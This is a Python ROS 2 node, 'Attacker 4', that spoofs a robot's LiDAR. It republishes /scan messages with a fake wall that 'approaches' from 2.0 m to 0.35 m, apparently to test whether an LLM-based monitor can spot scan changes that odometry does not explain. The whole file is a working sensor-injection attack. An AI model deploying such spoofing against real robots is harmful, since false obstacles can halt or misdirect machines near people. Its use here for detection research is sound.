"""
Attacker 4: gradual approach at sensor rate (~5 Hz).
The fake obstacle starts at 2.0 m and "approaches" to 0.35 m over ~10 scans,
mimicking a real obstacle moving toward the robot. Physically implausible because
the robot itself isn't moving — the LLM must correlate scan changes with odometry.
"""
import copy
import math
import rclpy
import rclpy.parameter
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
from sensor_msgs.msg import LaserScan

SENSOR_QOS = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT,
                        durability=DurabilityPolicy.VOLATILE)
PUB_QOS    = QoSProfile(depth=10, reliability=ReliabilityPolicy.RELIABLE,
                        durability=DurabilityPolicy.VOLATILE)

WALL_HALF_DEG = 50
START_RANGE   = 2.0
FINAL_RANGE   = 0.35
STEP          = 0.15   # metres closer per scan


class Attacker4(Node):
    def __init__(self, **kwargs):
        super().__init__('lidar_attacker4', **kwargs)
        self._range = START_RANGE
        self.sub = self.create_subscription(LaserScan, '/scan', self._cb, SENSOR_QOS)
        self.pub = self.create_publisher(LaserScan, '/scan', PUB_QOS)
        self.get_logger().info(
            f'Attacker 4: gradual approach {START_RANGE}m → {FINAL_RANGE}m, '
            f'step={STEP}m/scan')

    def _cb(self, msg: LaserScan):
        n      = len(msg.ranges)
        center = int(round(-msg.angle_min / msg.angle_increment)) % n
        spread = int(round(math.radians(WALL_HALF_DEG) / msg.angle_increment))
        fake   = copy.deepcopy(msg)
        fake.header.stamp = self.get_clock().now().to_msg()
        for off in range(-spread, spread + 1):
            fake.ranges[(center + off) % n] = self._range
        self.pub.publish(fake)
        self.get_logger().info(f'  fake wall at {self._range:.2f} m')
        if self._range > FINAL_RANGE:
            self._range = max(FINAL_RANGE, self._range - STEP)


def main():
    rclpy.init()
    node = Attacker4(parameter_overrides=[
        rclpy.parameter.Parameter('use_sim_time', rclpy.parameter.Parameter.Type.BOOL, True)
    ])
    rclpy.spin(node)
    rclpy.shutdown()
